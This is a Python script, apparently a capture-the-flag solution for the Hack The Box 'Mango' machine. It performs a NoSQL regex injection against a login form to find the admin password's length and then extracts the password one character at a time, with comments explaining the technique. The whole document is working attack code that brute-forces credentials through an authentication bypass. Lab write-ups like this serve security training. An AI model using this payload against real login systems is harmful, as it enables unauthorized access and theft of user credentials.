import requests
import string


username='admin'
url='http://staging-order.mango.htb'
password_len = 0
print("searching length")
#while True means loop forever, so we iterate through sending our payload (a POST request) with the noSQLi regex payload along with an increasing integer, once we go an integer over the password length, we will bypass auth and admin@mango.htb will be in the url response
while True:
	payload = {
		"username": username,
		"password[$regex]": ".{" + str(password_len) + "}",
		"login": "login"
	}
	print("trying length {0}".format(password_len))
	r = requests.post(url, payload)
	
	if 'admin@mango.htb' not in r.text: #can also look for status codes ""if int(pr.status_code)==302:""
	
		break
	password_len += 1
#remove 1 from password_len to account for the 1 we had to add to hit our break condition
password_len -= 1
print(("password length: {0}".format(password_len)))
password = ('')
#while the length of our password variable does not match the obtained password_len our condition runs through chars in string.printable, as it hits correct characters the loop starts over and adds the correct character sequentially 
while len(password) != password_len:
	#the list comprehension regarding adding the backslash is important as this stops the attack from breaking 		if c lands on a special character
	for c in list(string.ascii_letters+string.digits)+["\\"+c for c in string.punctuation+string.whitespace ]:
			payload = {
				"username": username,
				"password[$regex]": "^{0}{1}".format(password, c),

				"login": "login"
			}
			
			print("trying {0}".format(password+c))
			r = requests.post(url, payload)
			if 'admin@mango.htb' in r.text:
				#the code to replace the double slash is important otherwise you will have an inacurate 				password (attack will stop early due to thinking it has hit the correct amount of 					characters)
				password += c.replace("\\","")
				break
			else:
				print(password)
print(("password = {0}".format(password)))
